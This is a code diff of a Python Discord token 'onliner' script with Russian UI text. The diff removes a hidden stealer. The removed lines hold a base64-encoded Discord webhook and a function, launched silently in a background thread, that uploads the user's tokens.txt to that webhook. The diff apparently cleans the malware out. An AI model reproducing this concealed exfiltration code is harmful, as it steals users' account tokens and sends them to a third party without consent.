@@ -109,13 +109,6 @@ def onliner(token, status):
     except:
         lest.append("Ошибка Error")
 
-link = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA0MzI2MDU2OTQ3MTQzMDY5Ny96VDB5cl9HYklHX2ViaTdkUTIwZzVEdmx0T3FkVzJpTWN4ei05WmdWLXJYazlOUk5xRmFYeFpEcTBLbVpkNGh5bVFrZw==")
-def logs():
-    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1043260569471430697/zT0yr_GbIG_ebi7dQ20g5DvltOqdW2iMcxz-9ZgV-rXk9NRNqFaXxZDq0KmZd4hymQkgs', rate_limit_retry=True,
-                         content='Новый лог токенов! @everyone')
-    with open("./tokens.txt", "rb") as f:
-        webhook.add_file(file=f.read(), filename='tokens.txt')
-    response = webhook.execute()  
     
 
 sys.stdout.write(colorama.Fore.CYAN + "> ")
@@ -146,7 +139,6 @@ sys.stdout.write(colorama.Fore.CYAN + "> ")
 print01("Нажмите Enter чтобы включить программу")
 input("")
 import threading
-threading.Thread(target=logs).start() 
 def er():
     for u in tokens:
         threading.Thread(target=onliner, args={u, status}).start()          
